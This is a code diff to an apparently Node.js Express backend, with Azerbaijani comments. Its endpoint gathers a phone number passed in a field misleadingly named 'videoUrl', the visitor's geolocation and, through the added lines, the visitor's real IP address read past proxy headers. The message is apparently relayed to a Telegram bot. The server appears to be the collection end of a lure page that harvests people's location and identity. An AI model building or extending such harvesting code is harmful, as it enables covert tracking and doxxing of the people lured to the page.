@@ -49,11 +49,19 @@ app.post('/api/send-data', async (req, res) => {
   try {
     const { videoUrl, location } = req.body;
 
+    // Real IP (Render/Proxy arxasında düzgün çıxması üçün)
+    const ip =
+      (req.headers['x-forwarded-for']?.split(',')[0] || '').trim() ||
+      req.socket.remoteAddress ||
+      'Unknown';
+
     let message = '';
 
     if (videoUrl) {
       message += `📞 Nömrə: ${videoUrl}\n`;
     }
+
+    message += `🖥️ IP: ${ip}\n`;
 
     if (location?.latitude && location?.longitude) {
       message += `📍 Lokasiya alındı\n`;
@@ -70,6 +78,7 @@ app.post('/api/send-data', async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
+
 
 // ================== TELEGRAM WEBHOOK ==================
 app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
